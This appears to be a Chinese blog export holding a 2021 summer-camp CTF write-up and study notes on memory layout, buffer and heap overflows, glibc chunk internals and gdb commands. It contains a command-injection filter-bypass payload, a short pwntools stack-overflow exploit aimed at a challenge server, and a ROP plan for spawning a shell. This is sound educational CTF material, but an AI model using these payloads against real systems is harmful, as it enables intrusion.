%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x00 ping 很明显的命令执行，输入url/?ip=127.0.0.1|ls，可以观察到存在可以的文件。 空格和flag无法传入，这里先绕过空格读一下源码 \u003c?php if(isset($_GET['ip'])){ $ip = $_GET['ip']; if(preg_match(\"/\\\u0026|\\/|\\?|\\*|\\\u003c|[\\x{00}-\\x{1f}]|\\\u003e|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match)){ print_r($match); print($ip); echo preg_match(\"/\\\u0026|\\/|\\?|\\*|\\\u003c|[\\x{00}-\\x{20}]|\\\u003e|\\'|\\\"|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/\", $ip, $match); die(\"ban symbol!\"); } else if(preg_match(\"/ /\", $ip)){ die(\"ban space!\"); } else if(preg_match(\"/bash/\", $ip)){ die(\"ban bash!\"); } else if(preg_match(\"/.*f.*l.*a.*g.*/\", $ip)){ die(\"ban flag!\"); } $a = shell_exec(\"ping -c 4 \".$ip); echo \"\u003cpre\u003e\"; print_r($a); } ?\u003e 构造变量a来替代g，输入127.0.0.1;a=g;cat$IFS$1fla$a.php，拿到flag。 ","date":"2021-08-25","objectID":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/:1:0","tags":["CTF"],"title":"2021联盟暑期学校暨方滨兴院士班夏令营CTF竞赛WriteUp","uri":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x01 hidehight 用010editor打开发现有压缩包，上binwalk，然后foremost分离 拿出压缩包后，使用工具爆破。 成功解开压缩包，用010editor发现flag。 ","date":"2021-08-25","objectID":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/:2:0","tags":["CTF"],"title":"2021联盟暑期学校暨方滨兴院士班夏令营CTF竞赛WriteUp","uri":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x02 easyusb 先过滤出来usb.capdata != 00:00:00:00:00:00:00:00，怀疑这是键盘键入的值。 提取一下s1=[’s’,‘S’],s2=[’e’,‘E’],s3=[‘c’,‘C’],s4=[‘2’,’@’],s5=[’e’,‘E’],s6=[’t’,‘T’],s7=[‘k’,‘K’],s8=[‘3’,’#’],s9=[‘y’,‘Y’]。在线生成一个字典。 爆破，得到正确的密码。 解压文件。 ","date":"2021-08-25","objectID":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/:3:0","tags":["CTF"],"title":"2021联盟暑期学校暨方滨兴院士班夏令营CTF竞赛WriteUp","uri":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x03 置换密码 题目给出了加密的过程，反着写解密的过程。 text = 'ilhstlneoTR{N5A05PT11NC0PH1R}3'\rkey = [3,1,2]\rli0 = []\rli1 = []\rli2 = []\rfor i in range(0,len(text)):\rif i % 3 == 0:\rli2.append(text[i])\relif (i - 1) % 3 == 0:\rli0.append(text[i])\relif (i - 2) % 3 == 0:\rli1.append(text[i])\rli = []\rfor i in range(len(li1)):\rli.append(li1[i])\rli.append(li2[i])\rli.append(li0[i])\rprint(\"The ciphered text is :\")\rciphered_txt = (''.join(li))\rprint(ciphered_txt)\r","date":"2021-08-25","objectID":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/:4:0","tags":["CTF"],"title":"2021联盟暑期学校暨方滨兴院士班夏令营CTF竞赛WriteUp","uri":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x04 Easystack 题目明示栈溢出 下面贴出官方给的代码，当时比赛时太紧张地址掉了0x，直接白给。。。 from pwn import * context(os=\"linux\",arch=\"amd64\",log_level=\"debug\") p = remote(\"81.70.89.91\",57001) addr = 0x0000000000400729 payload = b\"A\"*104+p64(addr) p.sendline(payload) p.interactive() ","date":"2021-08-25","objectID":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/:5:0","tags":["CTF"],"title":"2021联盟暑期学校暨方滨兴院士班夏令营CTF竞赛WriteUp","uri":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x05 神奇的网站 这题没做出来，赛后复现一下。 追踪流，在tcp.stream eq 3时发现一个可疑的压缩包。 过滤出来 导出分组字节流 解压出来一个flag文件 16进制打开看一哈，发现文件结尾是KP，结合TENET想到倒放，但不会操作。 看一下图片，感觉不太正常，丢到pngcheck里面过一遍，chunk块儿有问题。 这里用官方给的一个脚本。 \u003c?php $a = file_get_contents('flag'); file_put_contents(\"flag.zip\",strrev($a));?\u003e 得到压缩包，可以看到有wav的音频文件，需要解个密。 图片的宽度异常，只有0001 这里随便改大就好 然后会惊奇地发现！ 解压后是一段音频，听着太鬼畜了。。。，感觉也是倒放。移动到audacity，效果选择反向，可以了，是碳基生物的音乐了。然后使用网易云识别。 原理上最后应该是 复现的时候已经没了，不过偶然发现了另一个flag，hhh ","date":"2021-08-25","objectID":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/:6:0","tags":["CTF"],"title":"2021联盟暑期学校暨方滨兴院士班夏令营CTF竞赛WriteUp","uri":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x06 Java_app 这题也没做出来，复现下，先拖到雷电模拟器里面瞅瞅。是一个登录页面，随便试了试，感觉没什么有用信息。 把apk放到jeb里面反汇编，头一次用这个软件，不得不说，确实牛批。找到MainActivity，点击查看，可以发现是smali写的，按下Tab键，转成java代码。 发现一行关键代码，是匹配用户名密码是否正确的，可以看出用户名是sllenc3。 if((MainActivity.this.et_username.getText().toString().equals(\"s1lenc3\")) \u0026\u0026 (MainActivity.this.c.b(MainActivity.this.et_password.getText().toString()).equals(\"yGlszHNUzWZl2UIU0W8WNFdSMXBsNGNl/V5hwmRlI6FTyD5u0UgRL+FZ+/U\"))) 而密码则经过了check函数的校验，与后面那串字符串匹配。 后面的字符串包含[A-Za-z0-9+/]，应该和base64有关，据说是逆向中会常常碰到的base64换表加密，找一下加密后的base64表。 用python脚本跑一下，注意加密的str1要补全padding import base64\rimport string\r#要解密的代码\rstr1 = \"yGlszHNUzWZl2UIU0W8WNFdSMXBsNGNl/V5hwmRlI6FTyD5u0UgRL+FZ+/U=\"\r#改过之后的base64表\rstring1 = \"ABCDEFGHIJKLMNOP456789+/wxyz0123ghijklmnopqrstuvQRSTUVWXYZabcdef\"\rstring2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"\rprint (base64.b64decode(str1.translate(str.maketrans(string1,string2))))\r出来结果 ","date":"2021-08-25","objectID":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/:7:0","tags":["CTF"],"title":"2021联盟暑期学校暨方滨兴院士班夏令营CTF竞赛WriteUp","uri":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/"},{"categories":["WriteUp"],"content":"0x07 总结 菜是原罪，好几题有思路但做不出来QAQ，基本功不扎实，还要多学多练。感谢室友们，头一次组队打CTF，团队配合得非常nice，虽然都被dalao们按着锤了，但是没有关系，挺开心的，也蛮累的，不错的体验。 ","date":"2021-08-25","objectID":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/:8:0","tags":["CTF"],"title":"2021联盟暑期学校暨方滨兴院士班夏令营CTF竞赛WriteUp","uri":"/2021-08-25-2021%E8%81%94%E7%9B%9F%E6%9A%91%E6%9C%9F%E5%AD%A6%E6%A0%A1%E6%9A%A8%E6%96%B9%E6%BB%A8%E5%85%B4%E9%99%A2%E5%A3%AB%E7%8F%AD%E5%A4%8F%E4%BB%A4%E8%90%A5ctf%E7%AB%9E%E8%B5%9Bwriteup/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-08-24","objectID":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/:0:0","tags":null,"title":"2021年暑期夏令营笔记(day6)","uri":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/"},{"categories":["学习","安全技术"],"content":"0x00 基础知识 缓冲区溢出 内存的分类标准——五分类 在C++中，内存分成5个区，他们分别是堆，栈，自由存储区，全局/静态存续区，常量存续区。 （1）**栈：**内存由编译器在需要时自动分配和释放。通常用来存储局部变量和函数参数，函数调用后返回的地址。（为运行函数而分配的局部变量、函数参数、函数调用后返回地址等存放在栈区）。栈运算分配内置于处理器的指令集中，效率很高，但是分配的内存容量有限。 （2）**堆：**内存使用new进行分配，使用delete或delete[]释放。如果未能对内存进行正确的释放，会造成内存泄漏。但在程序结束时，会由操作系统自动回收。 （3）自由存储区：使用malloc进行分配，使用free进行回收。 （4）全局**/**静态存储区：全局变量和静态变量被分配到同一块内存中，C语言中区分初始化和未初始化的，C++中不再区分了。（全局变量、静态数据 存放在全局数据区） （5）常量存储区：存储常量，不允许被修改。 内存的分类标准——另一种五分类 （1）栈又叫堆栈，非静态局部变量/函数参数/返回值等等 ，还有每次调用函数时保存的信息。每当调用一个函数时，返回到的地址和关于调用者环境的某些信息的地址，比如一些机器寄存器，就会被保存在栈中。然后，新调用的函数在栈上分配空间，用于自动和临时变量。 2.内存映射段是高效的I/O映射方式，用于装载一个共享的动态内存库。用户可使用系统接口创建共享共享内存，做进程间通信。 3.堆用于程序运行时动态内存分配，堆是可以上增长的。堆区域从BSS段的末尾开始，并从那里逐渐增加到更大的地址。堆是由程序员自己分配的。堆区域由所有共享库和进程中动态加载的模块共享。 4.数据段分为初始化数据段和未初始化数据段。初始化的数据段，通常称为数据段，是程序的虚拟地址空间的一部分，它包含有程序员初始化的全局变量和静态变量，可以进一步划分为只读区域和读写区域。未初始化的数据段，通常称为bss段，这个段的数据在程序开始之前有内核初始化为0，包含所有初始化为0和没有显示初始化的全局变量和静态变量。 5.代码段也叫文本段，是对象文件或内存中程序的一部分，其中包含可执行代码和只读常量。文本段在堆栈的下面，是防止堆栈溢出覆盖它。，通常代码段是共享的，对于经常执行的程序，只有一个副本需要存储在内存中，代码段是只读的，以防止程序以外修改指令。 内存的分类标准——三分类 （1）静态（全局）存储区**——**static：内存在程序编译的时候就已经分配好，这块内存在程序的整个运行期间都存在。它主要存放静态数据、全局数据和常量。也是程序结束后，由操作系统释放。 （2）栈区**——**stack：在执行函数时，函数参数，局部变量（包括const局部变量），函数调用后返回的地址都在栈上创建，函数执行结束时这些存储单元自动被释放。栈内存分配运算内置于处理器的指令集中，效率很高，但是分配的内存容量有限。 （3）堆区——heap：亦称动态内存分配。程序在运行的时候用malloc或new申请任意大小的内存，程序员自己负责在适当的时候用free或 delete释放内存。动态内存的生存期可以由我们决定，如果我们不释放内存，程序将在最后才释放掉动态内存。 但是，良好的编程习惯是：如果某动态内存不再使用，需要将其释放掉，否则，我们认为发生了内存泄漏现象。 内存的分类标准——四分类 （1）代码区-–-—-主要存储程序代码指令，define定义的常量。 （2）全局数据区-–-–主要存储全局变量（常量），静态变量（常量），常量字符串。 （3）栈区-–-—-主要存储局部变量，栈区上的内容只在函数范围内存在，当函数运行结束，这些内容也会自动被销毁。其特点是效率高，但内存大小有限。 （4）堆区-–-—-由malloc,calloc分配的内存区域，其生命周期由free决定。堆的内存大小是由程序员分配的，理论上可以占据系统中的所有内存。 栈是机器系统提供的数据结构 ， 而堆则是C/C++函数库提供的 。对子程序的调用就是直接利用栈完成的 。 栈内存：由高地址向低地址，连续，快速，空间小； 堆内存：由低地址向高地址，不连续，缓慢，空间大。 栈区\r\u003ctd\u003e\r\u003cstrong\u003e堆区\u003c/strong\u003e\r\u003c/td\u003e\rStack memory内存空间由操作系统自动分配和释放。\r\u003ctd\u003e\rHeap Memory内存空间\u003cstrong\u003e手动申请和释放\u003c/strong\u003e的，Heap Memory内存常用\u003cstrong\u003enew\u003c/strong\u003e\u003cstrong\u003e关键字来分配\u003c/strong\u003e。\r\u003c/td\u003e\rStack Memory内存空间有限。\r\u003ctd\u003e\rHeap Memor的空间是很大的自由区几乎没有空间限制。\r\u003c/td\u003e\r栈和堆中主要放置了四种类型的数据：值类型(Value Type)，引用类型(Reference Type)，指针(Pointer)，指令(Instruction)。 值类型：bool、byte、char、decimal、double、enum、float、int、long、sbyte、short、struct、uint、ulong、ushort\r引用类型：class、interface、delegate、object、string\r引用类型总放在堆中，值类型和指针总放在他们被声明的地方。 函数调用约定参数传递顺序： 1.从右到左依次入栈：__stdcall，__cdecl，__thiscall，__fastcall 2.从左到右依次入栈：__pascal 栈的布局 Windows平台安全防护机制： GS编译技术 SEH的安全校验机制 Heap Cookie，Safe Unlinking等一系列堆安全机制 DEP数据执行保护 ASLR加载地址随机 SEHOP SEH的覆盖保护 Linux平台安全防护机制： NX： No-Execute，类似windows的DEP数据执行保护，将数据所在内存页标志为不可执行； ****Canary：类似windows的GS，在栈底附近放置随机cookie，函数返回时判断cookie是否被改变； PIE：地址空间分布随机化，程序入口基址每次加载均随机变化，类似windows的ASLR。 .PLT表—函数调用CALL时先跳转到函数的PLT地址，地址中存放的是.GOT表地址。 .GOT表—用于加载动态链接时，间接寻址得到函数的真实地址，函数真实地址在函数调用时才会写入GOT表。 八个比特(Bit)称为一个字节（Byte），两个字节称为一个字（Word），两个字称为一个双字（Dword），两个双字称为一个四字（Qword）。 ","date":"2021-08-24","objectID":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/:1:0","tags":null,"title":"2021年暑期夏令营笔记(day6)","uri":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/"},{"categories":["学习","安全技术"],"content":"0x01 2017“红帽杯”pwn1 1、分析程序流程，运行程序发现流程非常简单，即输入，原样输出。 2、IDA静态分析，scanf(“%s”,地址)，未对输入做限制，直接输入bad data覆盖返回地址即可。 3、GDB调试，padding=0x28，要是4的倍数所以为52，生成大于56个字符，即可覆盖返回地址。 4、检查安全防护机制 ，使用checksec发现，开启了NX。 5、思路，通过scanf函数读取’/bin/sh\\x0’保存到.bss段，采用ROP链（pop xxx; pop xxx; ret;指令）来跳过scanf函数的两个参数，接着返回到system函数地址执行.bss段上的’/bin/sh\\x0’，达到getshell目的。我们需要知道scanf函数地址、.bss段基址、ROP链地址、system函数地址、格式化串%s地址（scanf函数需要） 6、构建EXP，在程序.plt段找到system和scanf的PLT地址。 通过readelf –S xxx找到.bss段基址 通过IDA，在.rodata段找到格式化串地址 通过ROPgadget找到ROP链， ROPgadget --binary 'PATH' --only \"pop|pop|ret\" ","date":"2021-08-24","objectID":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/:2:0","tags":null,"title":"2021年暑期夏令营笔记(day6)","uri":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/"},{"categories":["学习","安全技术"],"content":"0x02 gdb/pwndbg 常用命令 参考自https://www.cnblogs.com/zhwer/p/12494317.html *为可选 黑色 为gdb原生命令 绿色 为 pwndbg 或 peda 插件命令 命令 缩写 效果 gdb \u003c*pid\u003e 添加新程序 gdb attach 负载运行的程序 set args \u003c*argv\u003e 设置程序运行参数 show args 查看设置好的运行参数 quit q 退出gdb symbol sy 导入符号表 info \u003c*b\u003e i 查看程序的状态/*查看断点 frame f 查看栈帧 backtrace bt 查看堆栈情况 list l 显示源代码 (debug模式) display disp 跟踪查看某个变量 start s 启动程序并中断在入口 debug模式停在main()，否则停在start() run r 直接运行程序直到断点 continue c 暂停后继续执行程序 next n 单步步过 step s 单步步入，函数跟踪 finish fin 跳出，执行到函数返回处 break /* b 下断点 watch 下内存断点并监视内存情况 print p 打印符号信息(debug模式) i r a 查看所有寄存器 i r \u003cesp/ebp..\u003e 查看某个寄存器 set $esp = 0x01 修改某个寄存器的值 heap 查看分配的chunk vmmap 查看内存分配情况 bin 查看 Bin 情况 x /\u003cn/f/u\u003e 显示内存信息，具体用法附在下面 context 打印 pwnbdg 页面信息 dps 优雅地显示内存信息 disassemble 打印函数信息 vmmap 显示程序内存结构 search \u003c*argv\u003e 搜索内存中的值 输入 search -h 可查询用法 checksec 查看程序保护机制 parseheap 优雅地查看分配的chunk aslr \u003con/off\u003e 打开/关闭 ASLR 保护 pshow 显示各种踏板选项和其他设置 dumpargs 显示在调用指令处停止时传递给函数的参数 dumprop 显示特定内存范围内的所有ROP gadgets elfheader 从调试的elf文件获取头信息 elfsymbol 从ELF文件获取非调试符号信息 procinfo 显示来自/proc/pid的各种信息 readelf 从elf文件获取头信息 x指令的具体用法：n、f、u为控制打印形式的参数 ’num’ 表示打印的数量 ’n’ 代表打印格式，可为o(八进制),x(十六进制),d(十进制),u(无符号十进制),t(二进制),f(浮点类型),a(地址类型),i(解析成命令并反编译),c(字符)和s(字符串) ‘f’ 用来设定输出长度，b(byte),h(halfword),w(word),giant(8bytes)。 ‘u’ 指定单位内存单元的字节数(默认为dword) 可用b(byte),h(halfword),w(word),giant(8bytes)替代 x指令也可以显示地址上的指令信息，用法：x/i ","date":"2021-08-24","objectID":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/:3:0","tags":null,"title":"2021年暑期夏令营笔记(day6)","uri":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/"},{"categories":["学习","安全技术"],"content":"0x03 堆溢出 堆管理器处于用户程序与内核中间，主要负责响应用户的申请内存请求和管理用户释放的内存。 为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。 用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。 linux glibc使用的ptmalloc2实现原理 宏观角度：创建堆、堆初始化、删除堆 微观角度：申请内存块、释放内存块 堆内存申请和释放实际是调用sbrk和mmap实现的。 ptmalloc 中使用一个 chunk 来表示用户请求分配的空间，释放后并非立即归还给操作系统。它们会被表示为一个chunk（堆分配最小单元），共分为4类（allocated chunk、free chunk、top chunk、Last remainder chunk），ptmalloc使用空闲管理链表来管理这些空闲的数据结构。fd 、bk字段只有在空闲chunk中存在，表示双向链表的前向指针和向后指针，否则表示用户数据。 struct malloc_chunk {\rINTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */\rINTERNAL_SIZE_T size; /* Size in bytes, including overhead. */\rstruct malloc_chunk* fd; /* double links -- used only if free. */\rstruct malloc_chunk* bk;\r/* Only used for large blocks: pointer to next larger size. */\rstruct malloc_chunk* fd_nextsize; /* double links -- used only if free. */\rstruct malloc_chunk* bk_nextsize;\r};\rtypedef struct malloc_chunk* mchunkptr;\rfd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）。fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。 一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。 //malloc.c\rstruct malloc_chunk {\rINTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */\rINTERNAL_SIZE_T size; /* Size in bytes, including overhead. */\r。。。。。。\r};\rtypedef struct malloc_chunk* mchunkptr;\rprev_size**，如果该 chunk 的物理相邻的前一地址** chunk**（**两个指针的地址差值为前一 chunk **大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 。 size，该 chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。 32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 **注意：**size_t 在 64 位中是 64 位无符号整数，32 位中是 32 位无符号整数。 已分配的chunk chunk 处于分配状态时，从 fd 字段开始是用户的数据。 mem指针：指向用户申请空间首地址，申请成功后返回给用户。 size字段的低三位从高到低（AMP）各有不同含义，不影响chunk 的大小。 (A) NON_MAIN_ARENA：标识chunk 是否不属于主线程，1 表示不属于，0 表示属于； (M) IS_MAPPED：记录当前 chunk 是否是由 mmap 分配的。； (P) PREV_INUSE，记录前一个 chunk 是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并。 空闲的chunk chunk处于空闲****状态时，会被添加到对应的空闲管理链表中，有两个位置记录其相应的大小。 fd字段指向下一个（非物理相邻）空闲的 chunk；bk 字段指向上一个（非物理相邻）空闲的 chunk。 通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理。 bin的概念 bin是一系列链表，用于系统在分配时寻找哪一个chunk是最适合的。 bin共有四种类型：fastbin、small bin、large bin和unsorted bin。 fastbin Fastbin是chunk最小的，也是分配起来最快的，因而得名fast bin.它可以分配的chunk的范围从0到80字节，总共有10个链表，分别对应不同的大小（在初始化的时候其实只设置到64字节，而不是80字节）， Fastbin链表中的chunk实际上没有使用chunk结构体中的bk指针，所以这个chunk链表就成为了单链表，使得操作更加迅速，另外，fastbin的chunk无法进行合并，所以指明前一个chunk是否被使用的标志为永远为1。 small bin 存储512字节以内的chunk。bin共62个，每一个bin的大小间距是8个字节，如果有两个相邻chunk都为空闲则需要合并，其中每一个bin的大小是固定的（也就是确定的，主要和large bin作比较）。 large bin 包含大于等于512字节的chunk。Bin共63个，组织方法如下： 32个bin 每64个字节一个阶层，比如第一个512-568字节，第二个576 - 632字节…… 16个bin 每512字节一个阶层 8个bin每4096字节一个阶层 4个bin每32768字节一个阶层 2个bin每262144字节一个阶层 最后一个bin包括所有剩下的大小 和small bin不同的地方在于，这里的每一个bin都保存的是一个范围而不是一个确定的值，每一个bin内的chunk大小是排好序的。不过和small bin一样也可以合并。 unsorted bin 当small或者large chunk（即small bin和large bin当中的chunk）被释放的时候会放入这个bin当中，这个bin只有一个，是一个循环链表，任意大小的chunk都可以放入这个bin。 top chunk 和 last remainder Top chunk其实是有效内存的一个边界，用来处理bin中的chunk没有可用chunk的情况。是要来保证分配成功的最后一条防线，他的格式和其他chunk一样，不过他的位置在有效内存的最边上(这就是为什么说他作为有效内存的边界)，而且他的前一个被使用的flag标志一直都被设置，防止访问前一个内存，在glibc的代码中认为这个chunk永远存在，当他的大小不够的时候会从系统中通过系统调用来分配新的内存，通过brk分配的内存会直接加入top chunk，通过mmap分配的内存会拥有新的heap，当然也拥有了新的top chunk. 在top chunk当中分配，是通过把top chunk切成两半，一半被分配走，另外一半成为新的top chunk，同时也成为了last remainder。 Tcache Tcache全名为Thread Local Caching，它为每个线程创建一个缓存，里面包含了一些小堆块。每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache bin中。对于每个tcache bin单链表，它和fast bin一样都是先进后出，而且prev_inuse标记位都不会被清除，所以tcache bin中的chunk不会被合并，即使和Top chunk相邻。 相对于其余四种bin，tcache是出现的最晚的，在libc2-26中才加入。 UAF漏洞 Use After Free 指当一个内存块被释放之后再次被使用。 会出现以下几种情况： 1）内存块被释放后，对应指针设置为 NULL ， 再次使用，程序崩溃。 2）内存块被释放后，对应指针没有设置为 NULL ，在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。 3）内存块被释放后，对应指针没有设置为 NULL，下一次使","date":"2021-08-24","objectID":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/:4:0","tags":null,"title":"2021年暑期夏令营笔记(day6)","uri":"/2021-08-24-2021%E5%B9%B4%E6%9A%91%E6%9C%9F%E5%A4%8F%E4%BB%A4%E8%90%A5%E7%AC%94%E8%AE%B0day6/"},{"categories":["学习","安全技术"],"content":"0x04 单字节溢出\u0026整数溢出 单字节溢出（off-by-one ）是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。 需要说明的一点是 off-by-one 是可以基于各种缓冲区的，比如栈、堆、bss 段等。 边界验证不严通常包括： 1）使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。 2）字符串操作不合适，如strcpy()。 由于整数在内存里面保存在一个固定长度的空间内，它能存储的最大值和最小值是固定的，如果我们尝试去存储一个数，而这个数又大于这个固定的最大值时，就会导致整数溢出。（x86-32 